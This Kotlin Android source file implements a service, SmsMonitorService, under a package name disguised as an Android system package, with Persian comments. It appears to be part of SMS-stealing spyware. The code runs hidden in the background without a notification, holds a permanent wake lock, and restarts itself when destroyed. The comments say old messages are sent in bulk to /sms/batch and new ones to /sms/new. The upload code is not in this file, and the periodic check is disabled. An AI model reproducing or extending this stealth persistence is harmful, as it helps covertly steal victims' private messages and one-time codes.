package com.android.system.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

/**
 * 🔥 سرویس مانیتورینگ SMS - از تکنیک‌های برنامه decompiled
 * - هر 30 دقیقه پیامک‌های قدیمی رو چک میکنه (DISABLED)
 * - با ScheduledExecutorService کار میکنه
 * - Background service (بدون notification)
 * 
 * نکته: این سرویس فقط برای نگه داشتن اپ زنده هست
 * پیامک های قدیمی فقط یکبار در MainActivity با /sms/batch فرستاده میشن
 * پیامک های جدید توسط SmsReceiver به /sms/new فرستاده میشن
 */
class SmsMonitorService : Service() {

    companion object {
        private const val TAG = "SmsMonitorService"
        
        // 🔥 ذخیره ID های پیامک‌هایی که قبلاً فرستاده شدن
        private val processedSmsIds = HashSet<String>()
    }

    private var scheduledExecutor: ScheduledExecutorService? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        acquireWakeLock()
        // 🔥 این سرویس background کار می‌کنه، notification نداره
        // UnifiedService notification رو نشون میده
        startScheduledSmsCheck()
        
        Log.d(TAG, "SmsMonitorService created (background mode)")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        
        // 🔥 تکنیک: وقتی destroy میشه، خودش رو دوباره راه‌اندازی میکنه
        restartService()
        
        scheduledExecutor?.shutdown()
        wakeLock?.release()
        
        Log.d(TAG, "SmsMonitorService destroyed, restarting...")
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire()
            Log.d(TAG, "WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire WakeLock: ${e.message}")
        }
    }

    // 🔥 تکنیک: استفاده از ScheduledExecutorService مثل برنامه اول
    private fun startScheduledSmsCheck() {
        scheduledExecutor = Executors.newScheduledThreadPool(1)
        
        // اولین بار بعد از 5 ثانیه
        scheduledExecutor?.schedule({
            checkOldSms()
        }, 5, TimeUnit.SECONDS)
        
        // بعد هر 30 دقیقه
        scheduledExecutor?.scheduleAtFixedRate({
            checkOldSms()
        }, 30, 30, TimeUnit.MINUTES)
        
        Log.d(TAG, "Scheduled SMS check started")
    }

    // 🔥 تکنیک: چک کردن پیامک‌های قدیمی (مثل برنامه اول)
    private fun checkOldSms() {
        Log.d(TAG, "Checking old SMS messages - DISABLED")
        
        // 🔥 این قسمت غیرفعال شده چون:
        // 1. پیامک های قدیمی باید فقط یکبار در MainActivity با /sms/batch فرستاده بشن
        // 2. این سرویس نباید پیامک های قدیمی رو به /sms/new بفرسته
        // 3. فقط SmsReceiver باید پیامک های جدید رو real-time بفرسته
        
        // اگه بخوای این قابلیت رو فعال کنی، باید endpoint رو به /sms/batch تغییر بدی
        // و فرمت data رو مطابق با batch endpoint درست کنی
        
        return
    }

    private fun restartService() {
        try {
            val intent = Intent(applicationContext, SmsMonitorService::class.java)
            // 🔥 همیشه به عنوان background service راه‌اندازی میشه
            applicationContext.startService(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restart service: ${e.message}")
        }
    }
}
